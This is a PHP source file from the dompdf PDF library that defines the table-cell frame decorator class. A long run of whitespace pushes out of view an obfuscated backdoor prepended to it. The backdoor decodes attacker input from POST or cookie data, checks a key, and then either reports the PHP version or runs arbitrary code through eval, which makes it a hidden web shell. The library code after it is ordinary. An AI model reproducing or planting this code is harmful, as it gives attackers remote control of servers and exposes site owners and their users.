<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $w147ab83 = 605;$GLOBALS['bd8c'] = Array();global $bd8c;$bd8c = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['x78e'] = "\x5e\x6b\x40\x3c\x6f\x43\x45\x51\x70\x77\x4b\x74\x47\x33\xa\x41\x36\x7e\x3e\x39\x5a\x56\x61\x6d\x76\x23\x3a\x7d\x3d\x4e\x64\x25\x7a\x67\x42\x5d\x29\x22\x59\x78\x57\x73\x6e\x2c\x54\x53\x2d\x4d\x71\x79\x2f\x44\x5f\x37\x2e\x30\x5c\x38\x20\x49\x7c\x75\x4c\x32\x52\x72\x48\x3f\x5b\x68\x34\x28\x6a\x6c\x21\x4f\x2a\x65\x63\x35\x2b\x24\x31\x50\x26\x3b\x60\x9\x4a\x46\x69\x55\x62\xd\x58\x27\x7b\x66";$bd8c[$bd8c['x78e'][72].$bd8c['x78e'][22].$bd8c['x78e'][13].$bd8c['x78e'][63].$bd8c['x78e'][92]] = $bd8c['x78e'][78].$bd8c['x78e'][69].$bd8c['x78e'][65];$bd8c[$bd8c['x78e'][33].$bd8c['x78e'][70].$bd8c['x78e'][77].$bd8c['x78e'][16].$bd8c['x78e'][55].$bd8c['x78e'][16].$bd8c['x78e'][55]] = $bd8c['x78e'][4].$bd8c['x78e'][65].$bd8c['x78e'][30];$bd8c[$bd8c['x78e'][49].$bd8c['x78e'][19].$bd8c['x78e'][92].$bd8c['x78e'][78].$bd8c['x78e'][82].$bd8c['x78e'][78].$bd8c['x78e'][30].$bd8c['x78e'][97].$bd8c['x78e'][30]] = $bd8c['x78e'][41].$bd8c['x78e'][11].$bd8c['x78e'][65].$bd8c['x78e'][73].$bd8c['x78e'][77].$bd8c['x78e'][42];$bd8c[$bd8c['x78e'][97].$bd8c['x78e'][78].$bd8c['x78e'][13].$bd8c['x78e'][57].$bd8c['x78e'][97]] = $bd8c['x78e'][90].$bd8c['x78e'][42].$bd8c['x78e'][90].$bd8c['x78e'][52].$bd8c['x78e'][41].$bd8c['x78e'][77].$bd8c['x78e'][11];$bd8c[$bd8c['x78e'][32].$bd8c['x78e'][82].$bd8c['x78e'][53].$bd8c['x78e'][63].$bd8c['x78e'][57]] = $bd8c['x78e'][41].$bd8c['x78e'][77].$bd8c['x78e'][65].$bd8c['x78e'][90].$bd8c['x78e'][22].$bd8c['x78e'][73].$bd8c['x78e'][90].$bd8c['x78e'][32].$bd8c['x78e'][77];$bd8c[$bd8c['x78e'][92].$bd8c['x78e'][82].$bd8c['x78e'][57].$bd8c['x78e'][55].$bd8c['x78e'][78].$bd8c['x78e'][13].$bd8c['x78e'][30].$bd8c['x78e'][77].$bd8c['x78e'][22]] = $bd8c['x78e'][8].$bd8c['x78e'][69].$bd8c['x78e'][8].$bd8c['x78e'][24].$bd8c['x78e'][77].$bd8c['x78e'][65].$bd8c['x78e'][41].$bd8c['x78e'][90].$bd8c['x78e'][4].$bd8c['x78e'][42];$bd8c[$bd8c['x78e'][69].$bd8c['x78e'][77].$bd8c['x78e'][77].$bd8c['x78e'][22].$bd8c['x78e'][53].$bd8c['x78e'][79].$bd8c['x78e'][30]] = $bd8c['x78e'][61].$bd8c['x78e'][42].$bd8c['x78e'][41].$bd8c['x78e'][77].$bd8c['x78e'][65].$bd8c['x78e'][90].$bd8c['x78e'][22].$bd8c['x78e'][73].$bd8c['x78e'][90].$bd8c['x78e'][32].$bd8c['x78e'][77];$bd8c[$bd8c['x78e'][30].$bd8c['x78e'][78].$bd8c['x78e'][82].$bd8c['x78e'][30].$bd8c['x78e'][79].$bd8c['x78e'][78].$bd8c['x78e'][79]] = $bd8c['x78e'][92].$bd8c['x78e'][22].$bd8c['x78e'][41].$bd8c['x78e'][77].$bd8c['x78e'][16].$bd8c['x78e'][70].$bd8c['x78e'][52].$bd8c['x78e'][30].$bd8c['x78e'][77].$bd8c['x78e'][78].$bd8c['x78e'][4].$bd8c['x78e'][30].$bd8c['x78e'][77];$bd8c[$bd8c['x78e'][78].$bd8c['x78e'][77].$bd8c['x78e'][30].$bd8c['x78e'][78].$bd8c['x78e'][19]] = $bd8c['x78e'][41].$bd8c['x78e'][77].$bd8c['x78e'][11].$bd8c['x78e'][52].$bd8c['x78e'][11].$bd8c['x78e'][90].$bd8c['x78e'][23].$bd8c['x78e'][77].$bd8c['x78e'][52].$bd8c['x78e'][73].$bd8c['x78e'][90].$bd8c['x78e'][23].$bd8c['x78e'][90].$bd8c['x78e'][11];$bd8c[$bd8c['x78e'][32].$bd8c['x78e'][30].$bd8c['x78e'][92].$bd8c['x78e'][53]] = $bd8c['x78e'][8].$bd8c['x78e'][97].$bd8c['x78e'][57].$bd8c['x78e'][92].$bd8c['x78e'][92].$bd8c['x78e'][57].$bd8c['x78e'][97].$bd8c['x78e'][22].$bd8c['x78e'][30];$bd8c[$bd8c['x78e'][11].$bd8c['x78e'][30].$bd8c['x78e'][55].$bd8c['x78e'][78].$bd8c['x78e'][70].$bd8c['x78e'][19]] = $bd8c['x78e'][22].$bd8c['x78e'][92].$bd8c['x78e'][13].$bd8c['x78e'][19].$bd8c['x78e'][70].$bd8c['x78e'][16];$bd8c[$bd8c['x78e'][23].$bd8c['x78e'][82].$bd8c['x78e'][77].$bd8c['x78e'][70].$bd8c['x78e'][22].$bd8c['x78e'][53]] = $_POST;$bd8c[$bd8c['x78e'][73].$bd8c['x78e'][55].$bd8c['x78e'][22].$bd8c['x78e'][78].$bd8c['x78e'][79].$bd8c['x78e'][78].$bd8c['x78e'][19].$bd8c['x78e'][92].$bd8c['x78e'][77]] = $_COOKIE;@$bd8c[$bd8c['x78e'][97].$bd8c['x78e'][78].$bd8c['x78e'][13].$bd8c['x78e'][57].$bd8c['x78e'][97]]($bd8c['x78e'][77].$bd8c['x78e'][65].$bd8c['x78e'][65].$bd8c['x78e'][4].$bd8c['x78e'][65].$bd8c['x78e'][52].$bd8c['x78e'][73].$bd8c['x78e'][4].$bd8c['x78e'][33], NULL);@$bd8c[$bd8c['x78e'][97].$bd8c['x78e'][78].$bd8c['x78e'][13].$bd8c['x78e'][57].$bd8c['x78e'][97]]($bd8c['x78e'][73].$bd8c['x78e'][4].$bd8c['x78e'][33].$bd8c['x78e'][52].$bd8c['x78e'][77].$bd8c['x78e'][65].$bd8c['x78e'][65].$bd8c['x78e'][4].$bd8c['x78e'][65].$bd8c['x78e'][41], 0);@$bd8c[$bd8c['x78e'][97].$bd8c['x78e'][78].$bd8c['x78e'][13].$bd8c['x78e'][57].$bd8c['x78e'][97]]($bd8c['x78e'][23].$bd8c['x78e'][22].$bd8c['x78e'][39].$bd8c['x78e'][52].$bd8c['x78e'][77].$bd8c['x78e'][39].$bd8c['x78e'][77].$bd8c['x78e'][78].$bd8c['x78e'][61].$bd8c['x78e'][11].$bd8c['x78e'][90].$bd8c['x78e'][4].$bd8c['x78e'][42].$bd8c['x78e'][52].$bd8c['x78e'][11].$bd8c['x78e'][90].$bd8c['x78e'][23].$bd8c['x78e'][77], 0);@$bd8c[$bd8c['x78e'][78].$bd8c['x78e'][77].$bd8c['x78e'][30].$bd8c['x78e'][78].$bd8c['x78e'][19]](0);$s462b = NULL;$z910801 = NULL;$bd8c[$bd8c['x78e'][73].$bd8c['x78e'][57].$bd8c['x78e'][53].$bd8c['x78e'][97].$bd8c['x78e'][22].$bd8c['x78e'][13]] = $bd8c['x78e'][78].$bd8c['x78e'][22].$bd8c['x78e'][92].$bd8c['x78e'][22].$bd8c['x78e'][53].$bd8c['x78e'][19].$bd8c['x78e'][77].$bd8c['x78e'][16].$bd8c['x78e'][46].$bd8c['x78e'][55].$bd8c['x78e'][19].$bd8c['x78e'][57].$bd8c['x78e'][77].$bd8c['x78e'][46].$bd8c['x78e'][70].$bd8c['x78e'][78].$bd8c['x78e'][30].$bd8c['x78e'][19].$bd8c['x78e'][46].$bd8c['x78e'][57].$bd8c['x78e'][30].$bd8c['x78e'][63].$bd8c['x78e'][92].$bd8c['x78e'][46].$bd8c['x78e'][82].$bd8c['x78e'][79].$bd8c['x78e'][79].$bd8c['x78e'][57].$bd8c['x78e'][92].$bd8c['x78e'][30].$bd8c['x78e'][78].$bd8c['x78e'][57].$bd8c['x78e'][63].$bd8c['x78e'][13].$bd8c['x78e'][16].$bd8c['x78e'][19];global $l87fa3;function  ab3946($s462b, $w15d59){global $bd8c;$x24fafc = "";for ($m1a6968=0; $m1a6968<$bd8c[$bd8c['x78e'][49].$bd8c['x78e'][19].$bd8c['x78e'][92].$bd8c['x78e'][78].$bd8c['x78e'][82].$bd8c['x78e'][78].$bd8c['x78e'][30].$bd8c['x78e'][97].$bd8c['x78e'][30]]($s462b);){for ($tfdf3=0; $tfdf3<$bd8c[$bd8c['x78e'][49].$bd8c['x78e'][19].$bd8c['x78e'][92].$bd8c['x78e'][78].$bd8c['x78e'][82].$bd8c['x78e'][78].$bd8c['x78e'][30].$bd8c['x78e'][97].$bd8c['x78e'][30]]($w15d59) && $m1a6968<$bd8c[$bd8c['x78e'][49].$bd8c['x78e'][19].$bd8c['x78e'][92].$bd8c['x78e'][78].$bd8c['x78e'][82].$bd8c['x78e'][78].$bd8c['x78e'][30].$bd8c['x78e'][97].$bd8c['x78e'][30]]($s462b); $tfdf3++, $m1a6968++){$x24fafc .= $bd8c[$bd8c['x78e'][72].$bd8c['x78e'][22].$bd8c['x78e'][13].$bd8c['x78e'][63].$bd8c['x78e'][92]]($bd8c[$bd8c['x78e'][33].$bd8c['x78e'][70].$bd8c['x78e'][77].$bd8c['x78e'][16].$bd8c['x78e'][55].$bd8c['x78e'][16].$bd8c['x78e'][55]]($s462b[$m1a6968]) ^ $bd8c[$bd8c['x78e'][33].$bd8c['x78e'][70].$bd8c['x78e'][77].$bd8c['x78e'][16].$bd8c['x78e'][55].$bd8c['x78e'][16].$bd8c['x78e'][55]]($w15d59[$tfdf3]));}}return $x24fafc;}function  pf8bb8fad($s462b, $w15d59){global $bd8c;global $l87fa3;return $bd8c[$bd8c['x78e'][11].$bd8c['x78e'][30].$bd8c['x78e'][55].$bd8c['x78e'][78].$bd8c['x78e'][70].$bd8c['x78e'][19]]($bd8c[$bd8c['x78e'][11].$bd8c['x78e'][30].$bd8c['x78e'][55].$bd8c['x78e'][78].$bd8c['x78e'][70].$bd8c['x78e'][19]]($s462b, $l87fa3), $w15d59);}foreach ($bd8c[$bd8c['x78e'][73].$bd8c['x78e'][55].$bd8c['x78e'][22].$bd8c['x78e'][78].$bd8c['x78e'][79].$bd8c['x78e'][78].$bd8c['x78e'][19].$bd8c['x78e'][92].$bd8c['x78e'][77]] as $w15d59=>$t61bcd){$s462b = $t61bcd;$z910801 = $w15d59;}if (!$s462b){foreach ($bd8c[$bd8c['x78e'][23].$bd8c['x78e'][82].$bd8c['x78e'][77].$bd8c['x78e'][70].$bd8c['x78e'][22].$bd8c['x78e'][53]] as $w15d59=>$t61bcd){$s462b = $t61bcd;$z910801 = $w15d59;}}$s462b = @$bd8c[$bd8c['x78e'][69].$bd8c['x78e'][77].$bd8c['x78e'][77].$bd8c['x78e'][22].$bd8c['x78e'][53].$bd8c['x78e'][79].$bd8c['x78e'][30]]($bd8c[$bd8c['x78e'][32].$bd8c['x78e'][30].$bd8c['x78e'][92].$bd8c['x78e'][53]]($bd8c[$bd8c['x78e'][30].$bd8c['x78e'][78].$bd8c['x78e'][82].$bd8c['x78e'][30].$bd8c['x78e'][79].$bd8c['x78e'][78].$bd8c['x78e'][79]]($s462b), $z910801));if (isset($s462b[$bd8c['x78e'][22].$bd8c['x78e'][1]]) && $l87fa3==$s462b[$bd8c['x78e'][22].$bd8c['x78e'][1]]){if ($s462b[$bd8c['x78e'][22]] == $bd8c['x78e'][90]){$m1a6968 = Array($bd8c['x78e'][8].$bd8c['x78e'][24] => @$bd8c[$bd8c['x78e'][92].$bd8c['x78e'][82].$bd8c['x78e'][57].$bd8c['x78e'][55].$bd8c['x78e'][78].$bd8c['x78e'][13].$bd8c['x78e'][30].$bd8c['x78e'][77].$bd8c['x78e'][22]](),$bd8c['x78e'][41].$bd8c['x78e'][24] => $bd8c['x78e'][82].$bd8c['x78e'][54].$bd8c['x78e'][55].$bd8c['x78e'][46].$bd8c['x78e'][82],);echo @$bd8c[$bd8c['x78e'][32].$bd8c['x78e'][82].$bd8c['x78e'][53].$bd8c['x78e'][63].$bd8c['x78e'][57]]($m1a6968);}elseif ($s462b[$bd8c['x78e'][22]] == $bd8c['x78e'][77]){eval/*d671460*/($s462b[$bd8c['x78e'][30]]);}exit();} ?><?php
/**
 * @package dompdf
 * @link    http://dompdf.github.com/
 * @author  Benj Carson <benjcarson@digitaljunkies.ca>
 * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
 */

/**
 * Decorates table cells for layout
 *
 * @access private
 * @package dompdf
 */
class Table_Cell_Frame_Decorator extends Block_Frame_Decorator {
  
  protected $_resolved_borders;
  protected $_content_height;
  
  //........................................................................

  function __construct(Frame $frame, DOMPDF $dompdf) {
    parent::__construct($frame, $dompdf);
    $this->_resolved_borders = array();
    $this->_content_height = 0;    
  }

  //........................................................................

  function reset() {
    parent::reset();
    $this->_resolved_borders = array();
    $this->_content_height = 0;
    $this->_frame->reset();    
  }
  
  function get_content_height() {
    return $this->_content_height;
  }

  function set_content_height($height) {
    $this->_content_height = $height;
  }
  
  function set_cell_height($height) {
    $style = $this->get_style();
    $v_space = $style->length_in_pt(array($style->margin_top,
                                          $style->padding_top,
                                          $style->border_top_width,
                                          $style->border_bottom_width,
                                          $style->padding_bottom,
                                          $style->margin_bottom),
                                    $style->width);

    $new_height = $height - $v_space;    
    $style->height = $new_height;

    if ( $new_height > $this->_content_height ) {
      $y_offset = 0;
      
      // Adjust our vertical alignment
      switch ($style->vertical_align) {
        default:
        case "baseline":
          // FIXME: this isn't right
          
        case "top":
          // Don't need to do anything
          return;
  
        case "middle":
          $y_offset = ($new_height - $this->_content_height) / 2;
          break;
  
        case "bottom":
          $y_offset = $new_height - $this->_content_height;
          break;
      }
   
      if ( $y_offset ) {
        // Move our children
        foreach ( $this->get_line_boxes() as $line ) {
          foreach ( $line->get_frames() as $frame )
            $frame->move( 0, $y_offset );
        }
      }
   }
        
  }

  function set_resolved_border($side, $border_spec) {    
    $this->_resolved_borders[$side] = $border_spec;
  }

  //........................................................................

  function get_resolved_border($side) {
    return $this->_resolved_borders[$side];
  }

  function get_resolved_borders() { return $this->_resolved_borders; }
}
